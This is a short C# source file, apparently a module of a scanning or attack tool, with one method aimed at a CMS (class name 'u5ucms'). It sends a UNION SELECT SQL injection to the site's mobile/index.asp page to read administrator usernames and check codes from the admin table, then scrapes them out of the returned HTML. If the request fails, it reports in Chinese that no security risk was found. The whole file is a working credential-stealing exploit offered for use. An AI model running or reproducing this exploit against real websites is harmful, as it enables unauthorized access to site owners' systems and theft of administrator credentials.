using System;
using System.Net;
namespace windowsmanger
{
	internal class u5ucms
	{
		public string exp(string url)
		{
			string result;
			try
			{
				string urls = url;
				if (!urls.Contains("http://"))
				{
					urls = "http://" + urls;
				}
				string exps = "/mobile/index.asp?act=view&id=1%20union%20select%201,Username%26chr(124)%26CheckCode%20from%20{pre}admin";
				WebClient cli = new WebClient();
				string shuju = cli.DownloadString(urls + exps);
				string shuju2 = shuju.Substring(shuju.IndexOf("<a href='index.asp?act=content&id=1'>") + 37, 100);
				string jieguo = shuju2.Substring(0, shuju2.IndexOf("</a>"));
				result = jieguo;
			}
			catch
			{
				result = "网站未发现安全隐患";
			}
			return result;
		}
	}
}
